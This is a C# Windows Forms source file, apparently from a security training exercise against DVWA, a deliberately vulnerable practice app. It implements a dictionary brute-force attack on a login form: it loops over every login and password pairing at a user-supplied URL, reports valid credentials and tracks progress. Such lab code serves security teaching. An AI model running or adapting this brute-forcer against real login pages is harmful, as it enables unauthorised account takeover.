using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Example1_BruteForce
{
    public partial class Method2 : Form
    {
        dvwaAuth dvwa;
        static int statusEnable = 0;
        public Method2()
        {
            InitializeComponent();
            dvwa = new dvwaAuth(richTextBox1);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            startBrute();
        }

        async void startBrute()
        {
            statusEnable = 1;
            string[] logins=richTextBox2.Text.Split('\n');
            string[] passwords=richTextBox3.Text.Split('\n');
            string url = textBox1.Text;
            int i=1;
            foreach (string login in logins)
            {
                if (login == "") continue;
                foreach (string password in passwords)
                {
                    if (password == "") continue;
                    if (dvwa == null || statusEnable==0)
                    {
                        statusEnable = 0;
                        break;
                    }
                    if (await dvwa.Login(url, login, password)==1)
                    {
                        BeginInvoke(new MethodInvoker(()=>richTextBox1.AppendText("Получены валидные логи: "+login+":"+password+"\n")));
                    }
                    BeginInvoke(new MethodInvoker(()=>label6.Text=i+++"/"+logins.Length*passwords.Length));
                }
                if (statusEnable == 0)
                    break;
            }
            MessageBox.Show("Brute force завершен!");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            statusEnable = 0;
        }

        private void Method2_FormClosed(object sender, FormClosedEventArgs e)
        {
            statusEnable = 0;
        }
    }
}
